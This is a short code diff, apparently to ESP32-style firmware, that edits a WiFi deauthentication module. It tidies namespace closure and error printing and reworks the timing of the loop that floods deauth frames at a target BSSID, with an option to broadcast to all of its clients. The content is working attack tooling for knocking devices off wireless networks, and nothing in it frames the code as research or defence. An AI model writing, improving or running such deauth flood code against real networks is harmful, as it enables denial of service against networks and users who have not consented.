@@ -74,6 +74,8 @@ void sendDeauthPacket(uint8_t *destAddr, uint8_t *srcAddr, uint8_t *bssidAddr) {
     }
 }
 
+}  // namespace (anonymous)
+
 namespace WiFiDeauth {
 
 DeauthResult sendDeauthFrames(const String &targetBSSID, uint32_t durationMs, bool broadcastClients) {
@@ -95,20 +97,21 @@ DeauthResult sendDeauthFrames(const String &targetBSSID, uint32_t durationMs, bo
 
     uint8_t bssid[6];
     if (!parseMAC(targetBSSID, bssid)) {
-        result.error = "Failed to parse target BSSID";
+        Serial.println("✗ Failed to parse target BSSID");
         return result;
     }
 
     g_deauthActive = true;
     g_deauthCount = 0;
     uint32_t startTime = millis();
+    uint32_t deadline = startTime + durationMs;
 
     Serial.println("Starting deauth flood...");
 
     uint8_t srcAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};  // Broadcast source
     uint8_t destAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast dest
 
-    while (millis() - startTime < durationMs && g_deauthActive) {
+    while ((int32_t)(millis() - deadline) < 0 && g_deauthActive) {
         if (broadcastClients) {
             // Send broadcast deauth to all clients
             sendDeauthPacket(destAddr, srcAddr, bssid);
